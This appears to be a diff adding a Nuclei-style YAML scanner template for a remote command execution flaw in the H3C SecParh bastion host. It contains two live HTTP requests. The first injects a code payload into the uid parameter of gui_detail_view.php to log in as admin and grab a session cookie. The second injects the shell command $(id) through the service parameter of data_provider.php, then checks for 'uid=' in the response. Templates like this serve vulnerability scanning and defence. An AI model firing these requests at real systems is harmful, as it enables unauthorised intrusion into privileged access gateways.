@@ -1,0 +1,56 @@
+id: h3c-secparh-data-provider-php-rce
+info:
+  name: H3C SecParh堡垒机 data_provider.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+  description: |
+    Exploits a remote command execution vulnerability in H3C SecParh堡垒机's data_provider.php.
+
+http:
+  - id: first-request
+    raw:
+      - |
+        GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: cookie
+        regex:
+          - "PHPSESSID=[a-z0-9]+"
+        internal: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "错误的id"
+          - "admin"
+          - "双人复核"
+          - "运维审计系统 - 运维审计系统"
+
+  - id: second-request
+    raw:
+      - |
+        GET /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min=40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "cmdline"
+          - "uid="
+      - type: word
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "text/x-json"
